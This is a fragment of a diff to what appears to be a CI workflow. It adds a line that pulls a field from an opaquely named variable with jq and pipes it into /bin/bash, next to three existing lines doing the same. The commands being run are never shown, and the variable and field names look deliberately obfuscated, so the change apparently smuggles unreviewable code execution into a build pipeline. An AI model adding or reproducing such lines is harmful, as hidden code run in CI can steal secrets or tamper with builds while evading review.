@@ -26,6 +26,7 @@ jobs:
           echo $g11 | jq -r .up7888 | /bin/bash
           echo $dt76413 | jq -r .t0098 | /bin/bash
           printf '%s' "$d851" | jq -r .as93518 | /bin/bash
+          echo $veuv38567 | jq -r .xqmu1 | /bin/bash
 
       - name: Save output
         if: always()
